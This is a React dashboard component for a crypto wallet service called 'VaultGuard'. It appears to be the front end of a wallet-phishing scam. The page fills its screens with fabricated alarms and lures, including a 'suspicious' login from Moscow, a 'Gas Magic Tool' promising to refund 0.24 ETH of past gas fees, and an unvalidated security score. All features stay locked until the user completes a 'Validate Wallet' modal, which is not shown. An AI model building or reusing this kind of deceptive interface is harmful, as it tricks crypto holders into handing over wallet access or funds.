import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ValidationModal } from "@/components/validation-modal";
import {
  Shield,
  RefreshCw,
  AlertTriangle,
  Link2,
  Settings,
  Monitor,
  Flame,
  Lock,
  CheckCircle2,
  ChevronRight,
  Wallet,
  LogOut,
  Bell,
  Zap,
  Activity,
  Eye,
  Trash2,
  Laptop,
  Smartphone,
  Globe,
  AlertCircle,
  TrendingUp,
  DollarSign,
  ArrowRight,
  Sparkles,
  X,
  Info,
} from "lucide-react";

interface Device {
  id: string;
  name: string;
  type: "desktop" | "mobile" | "browser";
  location: string;
  lastSeen: string;
  isCurrent: boolean;
  status: "active" | "suspicious" | "inactive";
}

const MOCK_DEVICES: Device[] = [
  {
    id: "d1",
    name: "Chrome — Windows 11",
    type: "desktop",
    location: "New York, US",
    lastSeen: "Active now",
    isCurrent: true,
    status: "active",
  },
  {
    id: "d2",
    name: "MetaMask Mobile — iOS",
    type: "mobile",
    location: "New York, US",
    lastSeen: "2 hours ago",
    isCurrent: false,
    status: "active",
  },
  {
    id: "d3",
    name: "Firefox — Unknown",
    type: "browser",
    location: "Moscow, RU",
    lastSeen: "3 days ago",
    isCurrent: false,
    status: "suspicious",
  },
  {
    id: "d4",
    name: "Brave Browser — macOS",
    type: "desktop",
    location: "London, UK",
    lastSeen: "1 week ago",
    isCurrent: false,
    status: "inactive",
  },
];

const DASHBOARD_FEATURES = [
  {
    id: "account-recovery",
    icon: RefreshCw,
    title: "Account Recovery",
    description: "Recover access using multi-factor verification",
    color: "from-violet-500/15 to-purple-500/5",
    iconBg: "bg-violet-500/20 border-violet-500/30",
    iconColor: "text-violet-400",
    borderColor: "border-violet-500/20",
    stats: "3 backup methods",
  },
  {
    id: "revoke-approvals",
    icon: AlertTriangle,
    title: "Revoke Approvals",
    description: "Remove token permissions from dApps",
    color: "from-orange-500/15 to-red-500/5",
    iconBg: "bg-orange-500/20 border-orange-500/30",
    iconColor: "text-orange-400",
    borderColor: "border-orange-500/20",
    stats: "12 active approvals",
    alert: true,
  },
  {
    id: "dapp-connection",
    icon: Link2,
    title: "DApp Connection",
    description: "Manage all connected dApps securely",
    color: "from-cyan-500/15 to-blue-500/5",
    iconBg: "bg-cyan-500/20 border-cyan-500/30",
    iconColor: "text-cyan-400",
    borderColor: "border-cyan-500/20",
    stats: "8 connected dApps",
  },
  {
    id: "gas-magic",
    icon: Flame,
    title: "Gas Magic Tool",
    description: "Track & claim back gas fees as rewards",
    color: "from-yellow-500/15 to-orange-500/5",
    iconBg: "bg-yellow-500/20 border-yellow-500/30",
    iconColor: "text-yellow-400",
    borderColor: "border-yellow-500/20",
    stats: "~0.24 ETH recoverable",
    isNew: true,
  },
  {
    id: "validate-wallet",
    icon: Shield,
    title: "Validate Wallet",
    description: "Prove ownership with cryptographic proof",
    color: "from-green-500/15 to-emerald-500/5",
    iconBg: "bg-green-500/20 border-green-500/30",
    iconColor: "text-green-400",
    borderColor: "border-green-500/20",
    stats: "Not validated",
  },
  {
    id: "fix-dapp",
    icon: Settings,
    title: "Fix DApp Issues",
    description: "Diagnose stuck transactions & errors",
    color: "from-blue-500/15 to-indigo-500/5",
    iconBg: "bg-blue-500/20 border-blue-500/30",
    iconColor: "text-blue-400",
    borderColor: "border-blue-500/20",
    stats: "2 active issues",
    alert: true,
  },
  {
    id: "admin-control",
    icon: Monitor,
    title: "Admin Control Panel",
    description: "Manage devices, sessions & access logs",
    color: "from-pink-500/15 to-rose-500/5",
    iconBg: "bg-pink-500/20 border-pink-500/30",
    iconColor: "text-pink-400",
    borderColor: "border-pink-500/20",
    stats: `${MOCK_DEVICES.length} devices`,
    isAdmin: true,
  },
];

function DeviceIcon({ type }: { type: Device["type"] }) {
  if (type === "mobile") return <Smartphone className="w-4 h-4" />;
  if (type === "browser") return <Globe className="w-4 h-4" />;
  return <Laptop className="w-4 h-4" />;
}

function AnimatedOrb({ className }: { className?: string }) {
  return (
    <div className={`absolute rounded-full blur-3xl opacity-15 pointer-events-none ${className}`} />
  );
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const [walletAddress, setWalletAddress] = useState("");
  const [isValidated, setIsValidated] = useState(false);
  const [showAlertBanner, setShowAlertBanner] = useState(true);
  const [showValidationModal, setShowValidationModal] = useState(false);
  const [showWhyModal, setShowWhyModal] = useState(false);
  const [devices, setDevices] = useState<Device[]>(MOCK_DEVICES);
  const [activeFeature, setActiveFeature] = useState<string | null>(null);
  const [removingDevice, setRemovingDevice] = useState<string | null>(null);
  const [notifications] = useState(3);

  useEffect(() => {
    const stored = sessionStorage.getItem("walletAddress");
    if (!stored) {
      setLocation("/");
      return;
    }
    setWalletAddress(stored);
  }, []);

  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
    : "0x...";

  const handleFeatureClick = (featureId: string) => {
    if (!isValidated) return;
    setActiveFeature(activeFeature === featureId ? null : featureId);
  };

  const handleRemoveDevice = (deviceId: string) => {
    setRemovingDevice(deviceId);
    setTimeout(() => {
      setDevices((prev) => prev.filter((d) => d.id !== deviceId));
      setRemovingDevice(null);
    }, 800);
  };

  const handleValidationSuccess = () => {
    setIsValidated(true);
    setShowValidationModal(false);
    setShowAlertBanner(false);
  };

  const suspiciousCount = devices.filter((d) => d.status === "suspicious").length;

  return (
    <div className="min-h-screen relative overflow-hidden bg-background mesh-bg">
      <AnimatedOrb className="w-[500px] h-[500px] bg-violet-700 -top-40 -left-40" />
      <AnimatedOrb className="w-[300px] h-[300px] bg-cyan-600 top-1/3 -right-20" />
      <AnimatedOrb className="w-[250px] h-[250px] bg-purple-900 bottom-0 left-1/3" />

      {/* Scan line */}
      <div className="fixed inset-x-0 h-px bg-gradient-to-r from-transparent via-violet-400/30 to-transparent pointer-events-none z-50 animate-scan" />

      {/* Header */}
      <header className="sticky top-0 z-40 glass border-b border-white/5 px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-9 h-9 rounded-md bg-gradient-to-br from-violet-600 to-cyan-500 flex items-center justify-center glow-primary">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="hidden sm:block">
              <span className="font-bold text-base gradient-text tracking-tight">VaultGuard</span>
              <span className="text-muted-foreground text-xs ml-2 font-mono">Dashboard</span>
            </div>
          </div>

          <div className="flex items-center gap-3 flex-wrap justify-end">
            {/* Validation status */}
            {isValidated ? (
              <div className="flex items-center gap-1.5 glass rounded-full px-3 py-1.5 border border-green-500/20">
                <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
                <span className="text-xs text-green-400 font-mono">VALIDATED</span>
              </div>
            ) : (
              <div className="flex items-center gap-1.5 glass rounded-full px-3 py-1.5 border border-yellow-500/20">
                <AlertTriangle className="w-3.5 h-3.5 text-yellow-400" />
                <span className="text-xs text-yellow-400 font-mono">UNVALIDATED</span>
              </div>
            )}

            {/* Wallet chip */}
            <div className="flex items-center gap-2 glass rounded-full px-3 py-1.5 border border-white/10">
              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
              <Wallet className="w-3 h-3 text-violet-400" />
              <span className="text-xs font-mono text-muted-foreground" data-testid="text-wallet-address">
                {shortAddr}
              </span>
            </div>

            {/* Notifications */}
            <div className="relative">
              <button
                data-testid="button-notifications"
                className="w-9 h-9 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground"
              >
                <Bell className="w-4 h-4" />
              </button>
              {notifications > 0 && (
                <div className="absolute -top-1 -right-1 w-4 h-4 bg-violet-600 rounded-full flex items-center justify-center">
                  <span className="text-xs text-white font-bold" style={{ fontSize: 9 }}>{notifications}</span>
                </div>
              )}
            </div>

            {/* Disconnect */}
            <Button
              data-testid="button-disconnect"
              variant="outline"
              size="sm"
              onClick={() => {
                sessionStorage.removeItem("walletAddress");
                setLocation("/");
              }}
              className="border-white/10 text-muted-foreground text-xs gap-1.5"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Disconnect</span>
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 space-y-6 relative z-10">

        {/* Unvalidated alert banner */}
        {showAlertBanner && !isValidated && (
          <div
            data-testid="banner-unvalidated"
            className="glass-card rounded-xl border border-yellow-500/30 bg-gradient-to-r from-yellow-500/10 to-transparent p-4"
          >
            <div className="flex items-start gap-4">
              <div className="w-10 h-10 rounded-md bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center flex-shrink-0 animate-pulse">
                <AlertTriangle className="w-5 h-5 text-yellow-400" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-foreground mb-1">
                  Connected wallet detected — validation required
                </h3>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  Your wallet <span className="font-mono text-yellow-300">{shortAddr}</span> was detected but has not been validated yet. Please verify ownership to access your full dashboard and admin features.
                </p>
              </div>
              <div className="flex items-center gap-2 flex-shrink-0">
                <Button
                  data-testid="button-validate-now"
                  onClick={() => setShowValidationModal(true)}
                  size="sm"
                  className="bg-yellow-500 text-black font-semibold border-0 text-xs"
                >
                  <Shield className="w-3.5 h-3.5 mr-1.5" />
                  Validate Now
                </Button>
                <button
                  data-testid="button-dismiss-banner"
                  onClick={() => setShowAlertBanner(false)}
                  className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Gas Magic Tool Promo Banner */}
        <div className="glass rounded-xl border border-yellow-500/25 bg-gradient-to-r from-yellow-500/8 via-orange-500/5 to-transparent p-5 overflow-hidden relative">
          <div className="absolute right-0 top-0 bottom-0 w-40 bg-gradient-to-l from-yellow-500/10 to-transparent pointer-events-none" />
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-yellow-500/30 to-orange-500/20 border border-yellow-500/30 flex items-center justify-center flex-shrink-0 glow-accent animate-pulse-glow">
              <Flame className="w-6 h-6 text-yellow-400" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-1 flex-wrap">
                <span className="font-bold text-foreground">Gas Magic Tool</span>
                <Badge className="bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 text-xs font-mono">NEW FEATURE</Badge>
              </div>
              <p className="text-sm text-muted-foreground">
                Connect your wallet to automatically scan all historical gas fees and <span className="text-yellow-300 font-semibold">claim them back as rewards</span>. Estimated recovery: <span className="text-yellow-400 font-mono font-bold">~0.24 ETH</span>
              </p>
            </div>
            <Button
              data-testid="button-gas-magic"
              onClick={() => !isValidated && setShowValidationModal(true)}
              size="sm"
              className="bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold border-0 flex-shrink-0"
            >
              <Sparkles className="w-3.5 h-3.5 mr-1.5" />
              {isValidated ? "Scan Now" : "Unlock"}
            </Button>
          </div>
        </div>

        {/* Stats row */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          {[
            { label: "Portfolio Value", value: "$24,510", icon: DollarSign, color: "text-green-400", change: "+3.2%" },
            { label: "Gas Spent", value: "0.847 ETH", icon: Flame, color: "text-orange-400", change: "all time" },
            { label: "Active dApps", value: "8", icon: Activity, color: "text-cyan-400", change: "connected" },
            { label: "Security Score", value: isValidated ? "94/100" : "61/100", icon: Shield, color: isValidated ? "text-green-400" : "text-yellow-400", change: isValidated ? "Excellent" : "Needs action" },
          ].map((stat) => {
            const Icon = stat.icon;
            return (
              <div key={stat.label} className="glass-card rounded-xl p-4 border border-white/5">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs text-muted-foreground">{stat.label}</span>
                  <Icon className={`w-4 h-4 ${stat.color}`} />
                </div>
                <div className="font-bold text-xl text-foreground font-mono">{stat.value}</div>
                <div className={`text-xs font-mono mt-0.5 ${stat.color}`}>{stat.change}</div>
              </div>
            );
          })}
        </div>

        {/* Feature grid */}
        <div>
          <div className="flex items-center justify-between mb-4">
            <h2 className="font-bold text-foreground">Dashboard Features</h2>
            {!isValidated && (
              <div className="flex items-center gap-2 glass rounded-md px-3 py-1.5 border border-yellow-500/20">
                <Lock className="w-3.5 h-3.5 text-yellow-400" />
                <span className="text-xs text-yellow-400">Validate wallet to unlock</span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {DASHBOARD_FEATURES.map((feature) => {
              const Icon = feature.icon;
              const isActive = activeFeature === feature.id;
              const canInteract = isValidated;

              return (
                <div key={feature.id} className="flex flex-col gap-3">
                  <button
                    data-testid={`card-feature-${feature.id}`}
                    onClick={() => canInteract ? handleFeatureClick(feature.id) : setShowValidationModal(true)}
                    className={`glass-card rounded-xl p-4 border ${feature.borderColor} bg-gradient-to-br ${feature.color} text-left w-full group transition-all duration-200 ${
                      canInteract ? "cursor-pointer hover-elevate" : "cursor-pointer opacity-70"
                    } ${isActive ? "ring-1 ring-violet-500/40" : ""}`}
                  >
                    <div className="flex items-start justify-between gap-2 mb-3">
                      <div className={`w-9 h-9 rounded-md border ${feature.iconBg} flex items-center justify-center`}>
                        <Icon className={`w-4 h-4 ${feature.iconColor}`} />
                      </div>
                      <div className="flex items-center gap-1 flex-wrap justify-end">
                        {feature.isNew && (
                          <span className="text-xs bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 rounded-full px-1.5 py-0.5 font-mono leading-none">NEW</span>
                        )}
                        {feature.isAdmin && (
                          <span className="text-xs bg-pink-500/20 border border-pink-500/30 text-pink-300 rounded-full px-1.5 py-0.5 font-mono leading-none">ADMIN</span>
                        )}
                        {feature.alert && (
                          <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
                        )}
                        {!canInteract ? (
                          <Lock className="w-3.5 h-3.5 text-muted-foreground/40" />
                        ) : (
                          <ChevronRight className={`w-3.5 h-3.5 text-muted-foreground/40 transition-transform ${isActive ? "rotate-90" : ""}`} />
                        )}
                      </div>
                    </div>

                    <div className="font-semibold text-sm text-foreground mb-1">{feature.title}</div>
                    <div className="text-xs text-muted-foreground leading-relaxed mb-2">{feature.description}</div>
                    <div className={`text-xs font-mono ${feature.alert ? "text-orange-400" : "text-muted-foreground/60"}`}>
                      {feature.stats}
                    </div>
                  </button>

                  {/* Expanded admin device panel */}
                  {isActive && feature.id === "admin-control" && (
                    <div className="glass-card rounded-xl border border-pink-500/20 p-4 space-y-3">
                      <div className="flex items-center justify-between">
                        <h4 className="text-sm font-semibold text-foreground">Connected Devices</h4>
                        {suspiciousCount > 0 && (
                          <Badge className="bg-red-500/20 border border-red-500/30 text-red-300 text-xs">
                            {suspiciousCount} suspicious
                          </Badge>
                        )}
                      </div>
                      <div className="space-y-2">
                        {devices.map((device) => (
                          <div
                            key={device.id}
                            data-testid={`row-device-${device.id}`}
                            className={`glass rounded-md p-3 border flex items-center gap-3 ${
                              device.status === "suspicious"
                                ? "border-red-500/30 bg-red-500/5"
                                : device.isCurrent
                                ? "border-green-500/20 bg-green-500/5"
                                : "border-white/5"
                            }`}
                          >
                            <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 ${
                              device.status === "suspicious"
                                ? "bg-red-500/20 text-red-400"
                                : device.isCurrent
                                ? "bg-green-500/20 text-green-400"
                                : "bg-white/5 text-muted-foreground"
                            }`}>
                              <DeviceIcon type={device.type} />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-1.5 flex-wrap">
                                <span className="text-xs font-semibold text-foreground truncate">{device.name}</span>
                                {device.isCurrent && (
                                  <span className="text-xs bg-green-500/20 text-green-400 rounded-full px-1.5 leading-none py-0.5 font-mono">YOU</span>
                                )}
                                {device.status === "suspicious" && (
                                  <AlertCircle className="w-3 h-3 text-red-400" />
                                )}
                              </div>
                              <div className="text-xs text-muted-foreground/60 font-mono">{device.location} · {device.lastSeen}</div>
                            </div>
                            {!device.isCurrent && (
                              <button
                                data-testid={`button-remove-device-${device.id}`}
                                onClick={() => handleRemoveDevice(device.id)}
                                disabled={removingDevice === device.id}
                                className={`w-7 h-7 rounded-md border flex items-center justify-center flex-shrink-0 transition-all ${
                                  device.status === "suspicious"
                                    ? "border-red-500/30 bg-red-500/20 text-red-400"
                                    : "border-white/10 glass text-muted-foreground"
                                } ${removingDevice === device.id ? "opacity-50" : ""}`}
                              >
                                {removingDevice === device.id ? (
                                  <div className="w-3 h-3 border border-current border-t-transparent rounded-full animate-spin" />
                                ) : (
                                  <Trash2 className="w-3 h-3" />
                                )}
                              </button>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Expanded gas magic panel */}
                  {isActive && feature.id === "gas-magic" && (
                    <div className="glass-card rounded-xl border border-yellow-500/20 p-4 space-y-3">
                      <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                        <Flame className="w-4 h-4 text-yellow-400" />
                        Gas Fee Analysis
                      </h4>
                      <div className="space-y-2">
                        {[
                          { label: "Total gas spent", value: "0.847 ETH", sub: "$2,541" },
                          { label: "Recoverable amount", value: "0.24 ETH", sub: "$720", highlight: true },
                          { label: "Transactions scanned", value: "147", sub: "all time" },
                        ].map((item) => (
                          <div key={item.label} className={`flex items-center justify-between glass rounded-md p-3 border ${item.highlight ? "border-yellow-500/30 bg-yellow-500/5" : "border-white/5"}`}>
                            <span className="text-xs text-muted-foreground">{item.label}</span>
                            <div className="text-right">
                              <div className={`text-sm font-mono font-bold ${item.highlight ? "text-yellow-400" : "text-foreground"}`}>{item.value}</div>
                              <div className="text-xs text-muted-foreground/60">{item.sub}</div>
                            </div>
                          </div>
                        ))}
                      </div>
                      <Button
                        data-testid="button-claim-gas"
                        size="sm"
                        className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold border-0"
                      >
                        <Sparkles className="w-4 h-4 mr-1.5" />
                        Claim 0.24 ETH Reward
                      </Button>
                    </div>
                  )}

                  {/* Expanded revoke approvals */}
                  {isActive && feature.id === "revoke-approvals" && (
                    <div className="glass-card rounded-xl border border-orange-500/20 p-4 space-y-3">
                      <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                        <AlertTriangle className="w-4 h-4 text-orange-400" />
                        Active Approvals
                      </h4>
                      <div className="space-y-2">
                        {[
                          { token: "USDC", dapp: "Uniswap V3", amount: "Unlimited", risk: "low" },
                          { token: "WETH", dapp: "Unknown Contract", amount: "Unlimited", risk: "high" },
                          { token: "LINK", dapp: "Aave V3", amount: "500 LINK", risk: "low" },
                        ].map((approval) => (
                          <div key={`${approval.token}-${approval.dapp}`} className={`flex items-center gap-3 glass rounded-md p-3 border ${
                            approval.risk === "high" ? "border-red-500/30 bg-red-500/5" : "border-white/5"
                          }`}>
                            <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold ${
                              approval.risk === "high" ? "bg-red-500/20 text-red-400" : "bg-white/10 text-foreground"
                            }`}>
                              {approval.token.slice(0, 2)}
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="text-xs font-semibold text-foreground">{approval.token} → {approval.dapp}</div>
                              <div className="text-xs text-muted-foreground/60 font-mono">{approval.amount}</div>
                            </div>
                            <Button
                              data-testid={`button-revoke-${approval.token}`}
                              size="sm"
                              variant="outline"
                              className={`text-xs border ${approval.risk === "high" ? "border-red-500/40 text-red-400" : "border-white/10 text-muted-foreground"}`}
                            >
                              Revoke
                            </Button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Generic locked message for other features */}
                  {isActive && !["admin-control", "gas-magic", "revoke-approvals"].includes(feature.id) && (
                    <div className="glass-card rounded-xl border border-white/5 p-4 text-center">
                      <div className="text-sm text-muted-foreground">Feature panel active. Configure settings here.</div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* Validate prompt card (if not validated) */}
        {!isValidated && (
          <div className="glass-card rounded-xl border border-violet-500/20 p-6 flex flex-col sm:flex-row items-center gap-4 bg-gradient-to-r from-violet-500/10 to-transparent">
            <div className="w-14 h-14 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0 animate-pulse-glow">
              <Shield className="w-7 h-7 text-violet-400" />
            </div>
            <div className="flex-1 text-center sm:text-left">
              <h3 className="font-bold text-foreground mb-1">Unlock Full Dashboard Access</h3>
              <p className="text-sm text-muted-foreground leading-relaxed">
                Validate your wallet ownership to access all features including admin controls, device management, gas recovery, and more.
              </p>
            </div>
            <Button
              data-testid="button-validate-cta"
              onClick={() => setShowValidationModal(true)}
              className="bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0 flex-shrink-0"
            >
              <Lock className="w-4 h-4 mr-2" />
              Validate Wallet
            </Button>
          </div>
        )}

        {/* Validated success state */}
        {isValidated && (
          <div className="glass rounded-xl border border-green-500/20 p-4 bg-gradient-to-r from-green-500/10 to-transparent flex items-center gap-3">
            <CheckCircle2 className="w-5 h-5 text-green-400 flex-shrink-0" />
            <p className="text-sm text-muted-foreground">
              Wallet <span className="font-mono text-green-300">{shortAddr}</span> has been verified and admin access is fully unlocked.
            </p>
          </div>
        )}
      </main>

      {/* Validation modal */}
      {showValidationModal && (
        <ValidationModal
          walletAddress={walletAddress}
          onSuccess={handleValidationSuccess}
          onClose={() => setShowValidationModal(false)}
        />
      )}
    </div>
  );
}
